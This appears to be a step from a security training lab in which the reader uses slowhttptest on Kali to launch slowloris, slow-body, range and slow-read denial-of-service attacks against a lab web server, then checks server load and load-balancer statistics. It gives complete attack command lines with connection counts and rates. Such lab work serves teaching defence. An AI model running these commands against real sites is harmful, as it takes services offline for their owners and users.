SLOWHTTPTEST
=======================

   a. (Kali) Browse to slowhttptest directory and execute attack

      i.  # cd /root/Agility/slowhttptest

      ii. # slowhttptest -c 1000 -H -g -o slowloris\_stats\_lab3 -i 10
          -r 200 -s 8192 -t GET -u http://hackazon-waf.f5agility.com -x
          24 -p 3

   b. Observe impact

      i.   Is site available?

      ii.  Review LTM virtual Server statistics

      iii. (Hackazon) Review Server Stats

           1. # top

           2. # free –m

   c. (Kali) Stop Attack

   d. (Optional) Try some other variants of slowhttptest

      i.   # slowhttptest -c 1000 -B -g -o slowloris\_stats\_lab3.1 -i
           10 -r 200 -s 8192 -t GET -u http://hackazon-waf.f5agility.com
           -x 24 -p 3

           1. Slow body attack

      ii.  # slowhttptest -c 1000 -R -g -o slowloris\_stats\_lab3.2 -i
           10 -r 200 -s 8192 -t GET -u http://hackazon-waf.f5agility.com
           -x 24 -p 3

           1. Range attack

      iii. # slowhttptest -c 1000 -X -g -o slowloris\_stats\_lab3.3 -i
           10 -r 200 -s 8192 -t GET -u http://hackazon-waf.f5agility.com
           -x 24 -p 3

           1. Slow read
